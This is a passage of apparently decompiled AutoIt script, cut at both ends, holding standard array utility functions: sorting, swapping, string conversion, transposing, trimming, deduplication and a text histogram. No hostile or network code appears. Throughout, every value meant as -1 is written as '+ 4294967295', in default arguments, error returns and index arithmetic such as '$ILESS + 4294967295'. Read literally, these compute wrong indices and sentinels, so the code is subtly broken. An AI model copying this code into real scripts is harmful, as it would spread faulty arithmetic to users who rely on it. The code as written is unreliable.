					If ( StringCompare ( $VTMP , $AARRAY [ $J ] ) >= 0 ) Then ExitLoop
					$AARRAY [ $J + 1 ] = $AARRAY [ $J ]
				Next
			EndIf
			$AARRAY [ $J + 1 ] = $VTMP
		Next
		Return
	EndIf
	Local $L = $ISTART , $R = $IEND , $VPIVOT = $AARRAY [ Int ( ( $ISTART + $IEND ) / 2 ) ] , $BNUM = IsNumber ( $VPIVOT )
	Do
		If $BNUM Then
			While ( $AARRAY [ $L ] < $VPIVOT And IsNumber ( $AARRAY [ $L ] ) ) Or ( Not IsNumber ( $AARRAY [ $L ] ) And StringCompare ( $AARRAY [ $L ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $AARRAY [ $R ] > $VPIVOT And IsNumber ( $AARRAY [ $R ] ) ) Or ( Not IsNumber ( $AARRAY [ $R ] ) And StringCompare ( $AARRAY [ $R ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		Else
			While ( StringCompare ( $AARRAY [ $L ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( StringCompare ( $AARRAY [ $R ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		EndIf
		If $L <= $R Then
			$VTMP = $AARRAY [ $L ]
			$AARRAY [ $L ] = $AARRAY [ $R ]
			$AARRAY [ $R ] = $VTMP
			$L += 1
			$R -= 1
		EndIf
	Until $L > $R
	__ARRAYQUICKSORT1D ( $AARRAY , $ISTART , $R )
	__ARRAYQUICKSORT1D ( $AARRAY , $L , $IEND )
EndFunc
Func __ARRAYQUICKSORT2D ( ByRef $AARRAY , Const ByRef $ISTEP , Const ByRef $ISTART , Const ByRef $IEND , Const ByRef $ISUBITEM , Const ByRef $ISUBMAX )
	If $IEND <= $ISTART Then Return
	Local $VTMP , $L = $ISTART , $R = $IEND , $VPIVOT = $AARRAY [ Int ( ( $ISTART + $IEND ) / 2 ) ] [ $ISUBITEM ] , $BNUM = IsNumber ( $VPIVOT )
	Do
		If $BNUM Then
			While ( $ISTEP * ( $AARRAY [ $L ] [ $ISUBITEM ] - $VPIVOT ) < 0 And IsNumber ( $AARRAY [ $L ] [ $ISUBITEM ] ) ) Or ( Not IsNumber ( $AARRAY [ $L ] [ $ISUBITEM ] ) And $ISTEP * StringCompare ( $AARRAY [ $L ] [ $ISUBITEM ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $ISTEP * ( $AARRAY [ $R ] [ $ISUBITEM ] - $VPIVOT ) > 0 And IsNumber ( $AARRAY [ $R ] [ $ISUBITEM ] ) ) Or ( Not IsNumber ( $AARRAY [ $R ] [ $ISUBITEM ] ) And $ISTEP * StringCompare ( $AARRAY [ $R ] [ $ISUBITEM ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		Else
			While ( $ISTEP * StringCompare ( $AARRAY [ $L ] [ $ISUBITEM ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $ISTEP * StringCompare ( $AARRAY [ $R ] [ $ISUBITEM ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		EndIf
		If $L <= $R Then
			For $I = 0 To $ISUBMAX
				$VTMP = $AARRAY [ $L ] [ $I ]
				$AARRAY [ $L ] [ $I ] = $AARRAY [ $R ] [ $I ]
				$AARRAY [ $R ] [ $I ] = $VTMP
			Next
			$L += 1
			$R -= 1
		EndIf
	Until $L > $R
	__ARRAYQUICKSORT2D ( $AARRAY , $ISTEP , $ISTART , $R , $ISUBITEM , $ISUBMAX )
	__ARRAYQUICKSORT2D ( $AARRAY , $ISTEP , $L , $IEND , $ISUBITEM , $ISUBMAX )
EndFunc
Func __ARRAYDUALPIVOTSORT ( ByRef $AARRAY , $IPIVOT_LEFT , $IPIVOT_RIGHT , $BLEFTMOST = True )
	If $IPIVOT_LEFT > $IPIVOT_RIGHT Then Return
	Local $ILENGTH = $IPIVOT_RIGHT - $IPIVOT_LEFT + 1
	Local $I , $J , $K , $IAI , $IAK , $IA1 , $IA2 , $ILAST
	If $ILENGTH < 45 Then
		If $BLEFTMOST Then
			$I = $IPIVOT_LEFT
			While $I < $IPIVOT_RIGHT
				$J = $I
				$IAI = $AARRAY [ $I + 1 ]
				While $IAI < $AARRAY [ $J ]
					$AARRAY [ $J + 1 ] = $AARRAY [ $J ]
					$J -= 1
					If $J + 1 = $IPIVOT_LEFT Then ExitLoop
				WEnd
				$AARRAY [ $J + 1 ] = $IAI
				$I += 1
			WEnd
		Else
			While 1
				If $IPIVOT_LEFT >= $IPIVOT_RIGHT Then Return 1
				$IPIVOT_LEFT += 1
				If $AARRAY [ $IPIVOT_LEFT ] < $AARRAY [ $IPIVOT_LEFT + 4294967295 ] Then ExitLoop
			WEnd
			While 1
				$K = $IPIVOT_LEFT
				$IPIVOT_LEFT += 1
				If $IPIVOT_LEFT > $IPIVOT_RIGHT Then ExitLoop
				$IA1 = $AARRAY [ $K ]
				$IA2 = $AARRAY [ $IPIVOT_LEFT ]
				If $IA1 < $IA2 Then
					$IA2 = $IA1
					$IA1 = $AARRAY [ $IPIVOT_LEFT ]
				EndIf
				$K -= 1
				While $IA1 < $AARRAY [ $K ]
					$AARRAY [ $K + 2 ] = $AARRAY [ $K ]
					$K -= 1
				WEnd
				$AARRAY [ $K + 2 ] = $IA1
				While $IA2 < $AARRAY [ $K ]
					$AARRAY [ $K + 1 ] = $AARRAY [ $K ]
					$K -= 1
				WEnd
				$AARRAY [ $K + 1 ] = $IA2
				$IPIVOT_LEFT += 1
			WEnd
			$ILAST = $AARRAY [ $IPIVOT_RIGHT ]
			$IPIVOT_RIGHT -= 1
			While $ILAST < $AARRAY [ $IPIVOT_RIGHT ]
				$AARRAY [ $IPIVOT_RIGHT + 1 ] = $AARRAY [ $IPIVOT_RIGHT ]
				$IPIVOT_RIGHT -= 1
			WEnd
			$AARRAY [ $IPIVOT_RIGHT + 1 ] = $ILAST
		EndIf
		Return 1
	EndIf
	Local $ISEVENTH = BitShift ( $ILENGTH , 3 ) + BitShift ( $ILENGTH , 6 ) + 1
	Local $IE1 , $IE2 , $IE3 , $IE4 , $IE5 , $T
	$IE3 = Ceiling ( ( $IPIVOT_LEFT + $IPIVOT_RIGHT ) / 2 )
	$IE2 = $IE3 - $ISEVENTH
	$IE1 = $IE2 - $ISEVENTH
	$IE4 = $IE3 + $ISEVENTH
	$IE5 = $IE4 + $ISEVENTH
	If $AARRAY [ $IE2 ] < $AARRAY [ $IE1 ] Then
		$T = $AARRAY [ $IE2 ]
		$AARRAY [ $IE2 ] = $AARRAY [ $IE1 ]
		$AARRAY [ $IE1 ] = $T
	EndIf
	If $AARRAY [ $IE3 ] < $AARRAY [ $IE2 ] Then
		$T = $AARRAY [ $IE3 ]
		$AARRAY [ $IE3 ] = $AARRAY [ $IE2 ]
		$AARRAY [ $IE2 ] = $T
		If $T < $AARRAY [ $IE1 ] Then
			$AARRAY [ $IE2 ] = $AARRAY [ $IE1 ]
			$AARRAY [ $IE1 ] = $T
		EndIf
	EndIf
	If $AARRAY [ $IE4 ] < $AARRAY [ $IE3 ] Then
		$T = $AARRAY [ $IE4 ]
		$AARRAY [ $IE4 ] = $AARRAY [ $IE3 ]
		$AARRAY [ $IE3 ] = $T
		If $T < $AARRAY [ $IE2 ] Then
			$AARRAY [ $IE3 ] = $AARRAY [ $IE2 ]
			$AARRAY [ $IE2 ] = $T
			If $T < $AARRAY [ $IE1 ] Then
				$AARRAY [ $IE2 ] = $AARRAY [ $IE1 ]
				$AARRAY [ $IE1 ] = $T
			EndIf
		EndIf
	EndIf
	If $AARRAY [ $IE5 ] < $AARRAY [ $IE4 ] Then
		$T = $AARRAY [ $IE5 ]
		$AARRAY [ $IE5 ] = $AARRAY [ $IE4 ]
		$AARRAY [ $IE4 ] = $T
		If $T < $AARRAY [ $IE3 ] Then
			$AARRAY [ $IE4 ] = $AARRAY [ $IE3 ]
			$AARRAY [ $IE3 ] = $T
			If $T < $AARRAY [ $IE2 ] Then
				$AARRAY [ $IE3 ] = $AARRAY [ $IE2 ]
				$AARRAY [ $IE2 ] = $T
				If $T < $AARRAY [ $IE1 ] Then
					$AARRAY [ $IE2 ] = $AARRAY [ $IE1 ]
					$AARRAY [ $IE1 ] = $T
				EndIf
			EndIf
		EndIf
	EndIf
	Local $ILESS = $IPIVOT_LEFT
	Local $IGREATER = $IPIVOT_RIGHT
	If ( ( $AARRAY [ $IE1 ] <> $AARRAY [ $IE2 ] ) And ( $AARRAY [ $IE2 ] <> $AARRAY [ $IE3 ] ) And ( $AARRAY [ $IE3 ] <> $AARRAY [ $IE4 ] ) And ( $AARRAY [ $IE4 ] <> $AARRAY [ $IE5 ] ) ) Then
		Local $IPIVOT_1 = $AARRAY [ $IE2 ]
		Local $IPIVOT_2 = $AARRAY [ $IE4 ]
		$AARRAY [ $IE2 ] = $AARRAY [ $IPIVOT_LEFT ]
		$AARRAY [ $IE4 ] = $AARRAY [ $IPIVOT_RIGHT ]
		Do
			$ILESS += 1
		Until $AARRAY [ $ILESS ] >= $IPIVOT_1
		Do
			$IGREATER -= 1
		Until $AARRAY [ $IGREATER ] <= $IPIVOT_2
		$K = $ILESS
		While $K <= $IGREATER
			$IAK = $AARRAY [ $K ]
			If $IAK < $IPIVOT_1 Then
				$AARRAY [ $K ] = $AARRAY [ $ILESS ]
				$AARRAY [ $ILESS ] = $IAK
				$ILESS += 1
			ElseIf $IAK > $IPIVOT_2 Then
				While $AARRAY [ $IGREATER ] > $IPIVOT_2
					$IGREATER -= 1
					If $IGREATER + 1 = $K Then ExitLoop 2
				WEnd
				If $AARRAY [ $IGREATER ] < $IPIVOT_1 Then
					$AARRAY [ $K ] = $AARRAY [ $ILESS ]
					$AARRAY [ $ILESS ] = $AARRAY [ $IGREATER ]
					$ILESS += 1
				Else
					$AARRAY [ $K ] = $AARRAY [ $IGREATER ]
				EndIf
				$AARRAY [ $IGREATER ] = $IAK
				$IGREATER -= 1
			EndIf
			$K += 1
		WEnd
		$AARRAY [ $IPIVOT_LEFT ] = $AARRAY [ $ILESS + 4294967295 ]
		$AARRAY [ $ILESS + 4294967295 ] = $IPIVOT_1
		$AARRAY [ $IPIVOT_RIGHT ] = $AARRAY [ $IGREATER + 1 ]
		$AARRAY [ $IGREATER + 1 ] = $IPIVOT_2
		__ARRAYDUALPIVOTSORT ( $AARRAY , $IPIVOT_LEFT , $ILESS + 4294967294 , True )
		__ARRAYDUALPIVOTSORT ( $AARRAY , $IGREATER + 2 , $IPIVOT_RIGHT , False )
		If ( $ILESS < $IE1 ) And ( $IE5 < $IGREATER ) Then
			While $AARRAY [ $ILESS ] = $IPIVOT_1
				$ILESS += 1
			WEnd
			While $AARRAY [ $IGREATER ] = $IPIVOT_2
				$IGREATER -= 1
			WEnd
			$K = $ILESS
			While $K <= $IGREATER
				$IAK = $AARRAY [ $K ]
				If $IAK = $IPIVOT_1 Then
					$AARRAY [ $K ] = $AARRAY [ $ILESS ]
					$AARRAY [ $ILESS ] = $IAK
					$ILESS += 1
				ElseIf $IAK = $IPIVOT_2 Then
					While $AARRAY [ $IGREATER ] = $IPIVOT_2
						$IGREATER -= 1
						If $IGREATER + 1 = $K Then ExitLoop 2
					WEnd
					If $AARRAY [ $IGREATER ] = $IPIVOT_1 Then
						$AARRAY [ $K ] = $AARRAY [ $ILESS ]
						$AARRAY [ $ILESS ] = $IPIVOT_1
						$ILESS += 1
					Else
						$AARRAY [ $K ] = $AARRAY [ $IGREATER ]
					EndIf
					$AARRAY [ $IGREATER ] = $IAK
					$IGREATER -= 1
				EndIf
				$K += 1
			WEnd
		EndIf
		__ARRAYDUALPIVOTSORT ( $AARRAY , $ILESS , $IGREATER , False )
	Else
		Local $IPIVOT = $AARRAY [ $IE3 ]
		$K = $ILESS
		While $K <= $IGREATER
			If $AARRAY [ $K ] = $IPIVOT Then
				$K += 1
				ContinueLoop
			EndIf
			$IAK = $AARRAY [ $K ]
			If $IAK < $IPIVOT Then
				$AARRAY [ $K ] = $AARRAY [ $ILESS ]
				$AARRAY [ $ILESS ] = $IAK
				$ILESS += 1
			Else
				While $AARRAY [ $IGREATER ] > $IPIVOT
					$IGREATER -= 1
				WEnd
				If $AARRAY [ $IGREATER ] < $IPIVOT Then
					$AARRAY [ $K ] = $AARRAY [ $ILESS ]
					$AARRAY [ $ILESS ] = $AARRAY [ $IGREATER ]
					$ILESS += 1
				Else
					$AARRAY [ $K ] = $IPIVOT
				EndIf
				$AARRAY [ $IGREATER ] = $IAK
				$IGREATER -= 1
			EndIf
			$K += 1
		WEnd
		__ARRAYDUALPIVOTSORT ( $AARRAY , $IPIVOT_LEFT , $ILESS + 4294967295 , True )
		__ARRAYDUALPIVOTSORT ( $AARRAY , $IGREATER + 1 , $IPIVOT_RIGHT , False )
	EndIf
EndFunc
Func _ARRAYSWAP ( ByRef $AARRAY , $IINDEX_1 , $IINDEX_2 , $BCOL = False , $ISTART = + 4294967295 , $IEND = + 4294967295 )
	If $BCOL = Default Then $BCOL = False
	If $ISTART = Default Then $ISTART = + 4294967295
	If $IEND = Default Then $IEND = + 4294967295
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
	If $IDIM_2 = + 4294967295 Then
		$BCOL = False
		$ISTART = + 4294967295
		$IEND = + 4294967295
	EndIf
	If $ISTART > $IEND Then Return SetError ( 5 , 0 , + 4294967295 )
	If $BCOL Then
		If $IINDEX_1 < 0 Or $IINDEX_2 > $IDIM_2 Then Return SetError ( 3 , 0 , + 4294967295 )
		If $ISTART = + 4294967295 Then $ISTART = 0
		If $IEND = + 4294967295 Then $IEND = $IDIM_1
	Else
		If $IINDEX_1 < 0 Or $IINDEX_2 > $IDIM_1 Then Return SetError ( 3 , 0 , + 4294967295 )
		If $ISTART = + 4294967295 Then $ISTART = 0
		If $IEND = + 4294967295 Then $IEND = $IDIM_2
	EndIf
	Local $VTMP
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		$VTMP = $AARRAY [ $IINDEX_1 ]
		$AARRAY [ $IINDEX_1 ] = $AARRAY [ $IINDEX_2 ]
		$AARRAY [ $IINDEX_2 ] = $VTMP
	Case 2
		If $ISTART < + 4294967295 Or $IEND < + 4294967295 Then Return SetError ( 4 , 0 , + 4294967295 )
		If $BCOL Then
			If $ISTART > $IDIM_1 Or $IEND > $IDIM_1 Then Return SetError ( 4 , 0 , + 4294967295 )
			For $J = $ISTART To $IEND
				$VTMP = $AARRAY [ $J ] [ $IINDEX_1 ]
				$AARRAY [ $J ] [ $IINDEX_1 ] = $AARRAY [ $J ] [ $IINDEX_2 ]
				$AARRAY [ $J ] [ $IINDEX_2 ] = $VTMP
			Next
		Else
			If $ISTART > $IDIM_2 Or $IEND > $IDIM_2 Then Return SetError ( 4 , 0 , + 4294967295 )
			For $J = $ISTART To $IEND
				$VTMP = $AARRAY [ $IINDEX_1 ] [ $J ]
				$AARRAY [ $IINDEX_1 ] [ $J ] = $AARRAY [ $IINDEX_2 ] [ $J ]
				$AARRAY [ $IINDEX_2 ] [ $J ] = $VTMP
			Next
		EndIf
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYTOCLIP ( Const ByRef $AARRAY , $SDELIM_COL = "|" , $ISTART_ROW = + 4294967295 , $IEND_ROW = + 4294967295 , $SDELIM_ROW = @CRLF , $ISTART_COL = + 4294967295 , $IEND_COL = + 4294967295 )
	Local $SRESULT = _ARRAYTOSTRING ( $AARRAY , $SDELIM_COL , $ISTART_ROW , $IEND_ROW , $SDELIM_ROW , $ISTART_COL , $IEND_COL )
	If @error Then Return SetError ( @error , 0 , 0 )
	If ClipPut ( $SRESULT ) Then Return 1
	Return SetError ( + 4294967295 , 0 , 0 )
EndFunc
Func _ARRAYTOSTRING ( Const ByRef $AARRAY , $SDELIM_COL = "|" , $ISTART_ROW = + 4294967295 , $IEND_ROW = + 4294967295 , $SDELIM_ROW = @CRLF , $ISTART_COL = + 4294967295 , $IEND_COL = + 4294967295 )
	If $SDELIM_COL = Default Then $SDELIM_COL = "|"
	If $SDELIM_ROW = Default Then $SDELIM_ROW = @CRLF
	If $ISTART_ROW = Default Then $ISTART_ROW = + 4294967295
	If $IEND_ROW = Default Then $IEND_ROW = + 4294967295
	If $ISTART_COL = Default Then $ISTART_COL = + 4294967295
	If $IEND_COL = Default Then $IEND_COL = + 4294967295
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If $ISTART_ROW = + 4294967295 Then $ISTART_ROW = 0
	If $IEND_ROW = + 4294967295 Then $IEND_ROW = $IDIM_1
	If $ISTART_ROW < + 4294967295 Or $IEND_ROW < + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART_ROW > $IDIM_1 Or $IEND_ROW > $IDIM_1 Then Return SetError ( 3 , 0 , "" )
	If $ISTART_ROW > $IEND_ROW Then Return SetError ( 4 , 0 , + 4294967295 )
	Local $SRET = ""
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		For $I = $ISTART_ROW To $IEND_ROW
			$SRET &= $AARRAY [ $I ] & $SDELIM_COL
		Next
		Return StringTrimRight ( $SRET , StringLen ( $SDELIM_COL ) )
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $ISTART_COL = + 4294967295 Then $ISTART_COL = 0
		If $IEND_COL = + 4294967295 Then $IEND_COL = $IDIM_2
		If $ISTART_COL < + 4294967295 Or $IEND_COL < + 4294967295 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $ISTART_COL > $IDIM_2 Or $IEND_COL > $IDIM_2 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $ISTART_COL > $IEND_COL Then Return SetError ( 6 , 0 , + 4294967295 )
		For $I = $ISTART_ROW To $IEND_ROW
			For $J = $ISTART_COL To $IEND_COL
				$SRET &= $AARRAY [ $I ] [ $J ] & $SDELIM_COL
			Next
			$SRET = StringTrimRight ( $SRET , StringLen ( $SDELIM_COL ) ) & $SDELIM_ROW
		Next
		Return StringTrimRight ( $SRET , StringLen ( $SDELIM_ROW ) )
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYTRANSPOSE ( ByRef $AARRAY )
	Switch UBound ( $AARRAY , 0 )
	Case 0
		Return SetError ( 2 , 0 , 0 )
	Case 1
		Local $ATEMP [ 1 ] [ UBound ( $AARRAY ) ]
		For $I = 0 To UBound ( $AARRAY ) + 4294967295
			$ATEMP [ 0 ] [ $I ] = $AARRAY [ $I ]
		Next
		$AARRAY = $ATEMP
	Case 2
		Local $IDIM_1 = UBound ( $AARRAY , 1 ) , $IDIM_2 = UBound ( $AARRAY , 2 )
		If $IDIM_1 <> $IDIM_2 Then
			Local $ATEMP [ $IDIM_2 ] [ $IDIM_1 ]
			For $I = 0 To $IDIM_1 + 4294967295
				For $J = 0 To $IDIM_2 + 4294967295
					$ATEMP [ $J ] [ $I ] = $AARRAY [ $I ] [ $J ]
				Next
			Next
			$AARRAY = $ATEMP
		Else
			Local $VELEMENT
			For $I = 0 To $IDIM_1 + 4294967295
				For $J = $I + 1 To $IDIM_2 + 4294967295
					$VELEMENT = $AARRAY [ $I ] [ $J ]
					$AARRAY [ $I ] [ $J ] = $AARRAY [ $J ] [ $I ]
					$AARRAY [ $J ] [ $I ] = $VELEMENT
				Next
			Next
		EndIf
Case Else
		Return SetError ( 1 , 0 , 0 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYTRIM ( ByRef $AARRAY , $ITRIMNUM , $IDIRECTION = 0 , $ISTART = 0 , $IEND = 0 , $ISUBITEM = 0 )
	If $IDIRECTION = Default Then $IDIRECTION = 0
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If $IEND = 0 Then $IEND = $IDIM_1
	If $ISTART > $IEND Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART < 0 Or $IEND < 0 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART > $IDIM_1 Or $IEND > $IDIM_1 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $IDIRECTION Then
			For $I = $ISTART To $IEND
				$AARRAY [ $I ] = StringTrimRight ( $AARRAY [ $I ] , $ITRIMNUM )
			Next
		Else
			For $I = $ISTART To $IEND
				$AARRAY [ $I ] = StringTrimLeft ( $AARRAY [ $I ] , $ITRIMNUM )
			Next
		EndIf
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $ISUBITEM < 0 Or $ISUBITEM > $IDIM_2 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $IDIRECTION Then
			For $I = $ISTART To $IEND
				$AARRAY [ $I ] [ $ISUBITEM ] = StringTrimRight ( $AARRAY [ $I ] [ $ISUBITEM ] , $ITRIMNUM )
			Next
		Else
			For $I = $ISTART To $IEND
				$AARRAY [ $I ] [ $ISUBITEM ] = StringTrimLeft ( $AARRAY [ $I ] [ $ISUBITEM ] , $ITRIMNUM )
			Next
		EndIf
Case Else
		Return SetError ( 2 , 0 , 0 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYUNIQUE ( Const ByRef $AARRAY , $ICOLUMN = 0 , $IBASE = 0 , $ICASE = 0 , $ICOUNT = $ARRAYUNIQUE_COUNT , $IINTTYPE = $ARRAYUNIQUE_AUTO )
	If $ICOLUMN = Default Then $ICOLUMN = 0
	If $IBASE = Default Then $IBASE = 0
	If $ICASE = Default Then $ICASE = 0
	If $ICOUNT = Default Then $ICOUNT = $ARRAYUNIQUE_COUNT
	If UBound ( $AARRAY , $UBOUND_ROWS ) = 0 Then Return SetError ( 1 , 0 , 0 )
	Local $IDIMS = UBound ( $AARRAY , $UBOUND_DIMENSIONS ) , $INUMCOLUMNS = UBound ( $AARRAY , $UBOUND_COLUMNS )
	If $IDIMS > 2 Then Return SetError ( 2 , 0 , 0 )
	If $IBASE < 0 Or $IBASE > 1 Or ( Not IsInt ( $IBASE ) ) Then Return SetError ( 3 , 0 , 0 )
	If $ICASE < 0 Or $ICASE > 1 Or ( Not IsInt ( $ICASE ) ) Then Return SetError ( 3 , 0 , 0 )
	If $ICOUNT < 0 Or $ICOUNT > 1 Or ( Not IsInt ( $ICOUNT ) ) Then Return SetError ( 4 , 0 , 0 )
	If $IINTTYPE < 0 Or $IINTTYPE > 4 Or ( Not IsInt ( $IINTTYPE ) ) Then Return SetError ( 5 , 0 , 0 )
	If $ICOLUMN < 0 Or ( $INUMCOLUMNS = 0 And $ICOLUMN > 0 ) Or ( $INUMCOLUMNS > 0 And $ICOLUMN >= $INUMCOLUMNS ) Then Return SetError ( 6 , 0 , 0 )
	If $IINTTYPE = $ARRAYUNIQUE_AUTO Then
		Local $VFIRSTELEM = ( ( $IDIMS = 1 ) ? ( $AARRAY [ $IBASE ] ) : ( $AARRAY [ $ICOLUMN ] [ $IBASE ] ) )
		If IsInt ( $VFIRSTELEM ) Then
			Switch VarGetType ( $VFIRSTELEM )
			Case "Int32"
				$IINTTYPE = $ARRAYUNIQUE_FORCE32
			Case "Int64"
				$IINTTYPE = $ARRAYUNIQUE_FORCE64
			EndSwitch
		Else
			$IINTTYPE = $ARRAYUNIQUE_FORCE32
		EndIf
	EndIf
	ObjEvent ( "AutoIt.Error" , "__ArrayUnique_AutoErrFunc" )
	Local $ODICTIONARY = ObjCreate ( "Scripting.Dictionary" )
	$ODICTIONARY .CompareMode = Number ( Not $ICASE )
	Local $VELEM , $STYPE , $VKEY , $BCOMERROR = False
	For $I = $IBASE To UBound ( $AARRAY ) + 4294967295
		If $IDIMS = 1 Then
			$VELEM = $AARRAY [ $I ]
		Else
			$VELEM = $AARRAY [ $I ] [ $ICOLUMN ]
		EndIf
		Switch $IINTTYPE
		Case $ARRAYUNIQUE_FORCE32
			$ODICTIONARY .Item ( $VELEM )
			If @error Then
				$BCOMERROR = True
				ExitLoop
			EndIf
		Case $ARRAYUNIQUE_FORCE64
			$STYPE = VarGetType ( $VELEM )
			If $STYPE = "Int32" Then
				$BCOMERROR = True
				ExitLoop
			EndIf
			$VKEY = "#" & $STYPE & "#" & String ( $VELEM )
			If Not $ODICTIONARY .Item ( $VKEY ) Then
				$ODICTIONARY ( $VKEY ) = $VELEM
			EndIf
		Case $ARRAYUNIQUE_MATCH
			$STYPE = VarGetType ( $VELEM )
			If StringLeft ( $STYPE , 3 ) = "Int" Then
				$VKEY = "#Int#" & String ( $VELEM )
			Else
				$VKEY = "#" & $STYPE & "#" & String ( $VELEM )
			EndIf
			If Not $ODICTIONARY .Item ( $VKEY ) Then
				$ODICTIONARY ( $VKEY ) = $VELEM
			EndIf
		Case $ARRAYUNIQUE_DISTINCT
			$VKEY = "#" & VarGetType ( $VELEM ) & "#" & String ( $VELEM )
			If Not $ODICTIONARY .Item ( $VKEY ) Then
				$ODICTIONARY ( $VKEY ) = $VELEM
			EndIf
		EndSwitch
	Next
	Local $AVALUES , $J = 0
	If $BCOMERROR Then
		Return SetError ( 7 , 0 , 0 )
	ElseIf $IINTTYPE <> $ARRAYUNIQUE_FORCE32 Then
		Local $AVALUES [ $ODICTIONARY .Count ]
		For $VKEY In $ODICTIONARY .Keys ( )
			$AVALUES [ $J ] = $ODICTIONARY ( $VKEY )
			If StringLeft ( $VKEY , 5 ) = "#Ptr#" Then
				$AVALUES [ $J ] = Ptr ( $AVALUES [ $J ] )
			EndIf
			$J += 1
		Next
	Else
		$AVALUES = $ODICTIONARY .Keys ( )
	EndIf
	If $ICOUNT Then
		_ARRAYINSERT ( $AVALUES , 0 , $ODICTIONARY .Count )
	EndIf
	Return $AVALUES
EndFunc
Func _ARRAY1DTOHISTOGRAM ( $AARRAY , $ISIZING = 100 )
	If UBound ( $AARRAY , 0 ) > 1 Then Return SetError ( 1 , 0 , "" )
	$ISIZING = $ISIZING * 8
	Local $T , $N , $IMIN = 0 , $IMAX = 0 , $IOFFSET = 0
	For $I = 0 To UBound ( $AARRAY ) + 4294967295
		$T = $AARRAY [ $I ]
		$T = IsNumber ( $T ) ? Round ( $T ) : 0
		If $T < $IMIN Then $IMIN = $T
		If $T > $IMAX Then $IMAX = $T
	Next
	Local $IRANGE = Int ( Round ( ( $IMAX - $IMIN ) / 8 ) ) * 8
	Local $ISPACERATIO = 4
	For $I = 0 To UBound ( $AARRAY ) + 4294967295
		$T = $AARRAY [ $I ]
		If $T Then
			$N = Abs ( Round ( ( $ISIZING * $T ) / $IRANGE ) / 8 )
			$AARRAY [ $I ] = ""
			If $T > 0 Then
				If $IMIN Then
					$IOFFSET = Int ( Abs ( Round ( ( $ISIZING * $IMIN ) / $IRANGE ) / 8 ) / 8 * $ISPACERATIO )
					$AARRAY [ $I ] = __ARRAY_STRINGREPEAT ( ChrW ( 32 ) , $IOFFSET )
				EndIf
			Else
				If $IMIN <> $T Then
					$IOFFSET = Int ( Abs ( Round ( ( $ISIZING * ( $T - $IMIN ) ) / $IRANGE ) / 8 ) / 8 * $ISPACERATIO )
					$AARRAY [ $I ] = __ARRAY_STRINGREPEAT ( ChrW ( 32 ) , $IOFFSET )
				EndIf
			EndIf
			$AARRAY [ $I ] &= __ARRAY_STRINGREPEAT ( ChrW ( 9608 ) , Int ( $N / 8 ) )
			$N = Mod ( $N , 8 )
			If $N > 0 Then $AARRAY [ $I ] &= ChrW ( 9608 + 8 - $N )
			$AARRAY [ $I ] &= " " & $T
		Else
			$AARRAY [ $I ] = ""
		EndIf
	Next
	Return $AARRAY
EndFunc
Func __ARRAY_STRINGREPEAT ( $SSTRING , $IREPEATCOUNT )
	$IREPEATCOUNT = Int ( $IREPEATCOUNT )
	If StringLen ( $SSTRING ) < 1 Or $IREPEATCOUNT <= 0 Then Return SetError ( 1 , 0 , "" )
	Local $SRESULT = ""
	While $IREPEATCOUNT > 1
		If BitAND ( $IREPEATCOUNT , 1 ) Then $SRESULT &= $SSTRING
		$SSTRING &= $SSTRING
		$IREPEATCOUNT = BitShift ( $IREPEATCOUNT , 1 )
	WEnd
	Return $SSTRING & $SRESULT
EndFunc
Func __ARRAY_EXETERINTERNAL ( ByRef $AARRAY , $ISTART , $ISIZE , $SDELIMITER , ByRef $AIDX , ByRef $ARESULT , ByRef $ICOUNT )
	If $ISTART == $ISIZE + 4294967295 Then
		For $I = 0 To $ISIZE + 4294967295
			$ARESULT [ $ICOUNT ] &= $AARRAY [ $AIDX [ $I ] ] & $SDELIMITER
		Next
		If $SDELIMITER <> "" Then $ARESULT [ $ICOUNT ] = StringTrimRight ( $ARESULT [ $ICOUNT ] , StringLen ( $SDELIMITER ) )
		$ICOUNT += 1
	Else
		Local $ITEMP
		For $I = $ISTART To $ISIZE + 4294967295
			$ITEMP = $AIDX [ $I ]
			$AIDX [ $I ] = $AIDX [ $ISTART ]
			$AIDX [ $ISTART ] = $ITEMP
			__ARRAY_EXETERINTERNAL ( $AARRAY , $ISTART + 1 , $ISIZE , $SDELIMITER , $AIDX , $ARESULT , $ICOUNT )
			$AIDX [ $ISTART ] = $AIDX [ $I ]
